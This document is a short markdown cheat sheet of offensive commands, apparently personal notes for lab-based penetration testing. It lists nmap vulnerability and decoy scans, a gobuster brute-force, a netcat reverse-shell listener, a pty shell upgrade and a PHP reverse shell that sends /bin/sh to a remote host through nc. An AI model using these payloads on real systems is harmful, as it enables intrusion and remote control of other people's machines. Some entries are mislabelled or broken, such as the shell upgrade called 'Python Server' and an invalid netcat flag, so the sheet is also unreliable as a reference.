# Useful Codes
---
## nMap
---
- Vulnerability Script Nmap SE
```bash
sudo nmap 10.129.15.75 -p 80 -sV --script vuln
```
- Decoy IP Nmap
```bash
sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
```

---
## Gobuster
---
- Gobuster Dir

```bash
gobuster dir -u http://$IP --wordlist $Wordlist
```
---
## Hydra
---



---
## Netcat
---
- Listening for incoming RevShells
```sh
nc -lvnp port
```
- Listen for incoming calls
```sh
nc -nc ip port
```

---
## Python
---
- Python Server
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---
## Revshells
---
- PHP Reverse Shell
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"); ?>
```

---
## XML Prettyfy
---
```bash
xsltproc all.xml -o all.html (nmap xml to html)
```